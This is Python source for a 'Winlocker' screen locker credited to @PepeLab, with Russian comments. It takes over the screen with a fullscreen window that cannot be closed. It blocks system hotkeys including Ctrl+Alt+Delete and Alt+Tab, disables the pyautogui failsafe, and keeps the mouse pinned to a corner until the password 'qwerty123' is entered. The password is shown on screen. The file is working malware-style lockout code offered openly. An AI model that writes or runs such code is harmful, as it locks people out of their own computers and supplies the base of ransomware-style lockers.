from tkinter import Tk, Entry, Label
import pyautogui, sys
import keyboard
import getpass
import pygame
import os.path
import os

win = Tk()
pygame.mixer.init()
USER_NAME = getpass.getuser()

#НАСТРОЙКА ОКНА
#win.iconbitmap('icon.ico'),
win.title("Winlocker by @PepeLab")
win.protocol('WM_DELETE_WINDOW', lambda: None)
win.attributes('-fullscreen', True)
win.config(cursor="none")


#ОТКЛЮЧЕНИЕ ХОТКЕЕВ
keyboard.add_hotkey("win", lambda: None, suppress =True)
keyboard.add_hotkey("alt + f4", lambda: None, suppress =True)
keyboard.add_hotkey("alt + tab", lambda: None, suppress =True)
keyboard.add_hotkey("ctrl + alt + tab", lambda: None, suppress =True)
keyboard.add_hotkey("ctrl + shift + esc", lambda: None, suppress =True)
keyboard.add_hotkey("ctrl + alt + delete", lambda: None, suppress =True)
keyboard.add_hotkey("ctrl + alt + esc", lambda: None, suppress =True)
keyboard.add_hotkey("ctrl + esc", lambda: None, suppress =True)
keyboard.add_hotkey("alt + esc", lambda: None, suppress =True)
pyautogui.FAILSAFE = False


#ТЕКСТ
label = Label(win, text="Windows заблокирован", font='Courier 30')
label.place(relx=.5, rely=.4, anchor="center")
 
#ВОТЕРМАРКА
label = Label(win, text="Password: qwerty123", font='Courier 10')
label.place(relx=.5, rely=.94, anchor="center")

#ВВОД ПАРОЛЯ
entry = Entry(win, font='Courier 16')
entry.place(relx=.5, rely=.5, anchor="center", width=380, height=40)
entry.focus()

#ЗВУК
#pygame.mixer.music.load("sound.mp3")
#pygame.mixer.music.play(loops=0)


#ПРОВЕРКА ПАРОЛЯ
while True:
    pyautogui.moveTo(0, 0)
    win.update()
    if entry.get() == "qwerty123":
        sys.exit()
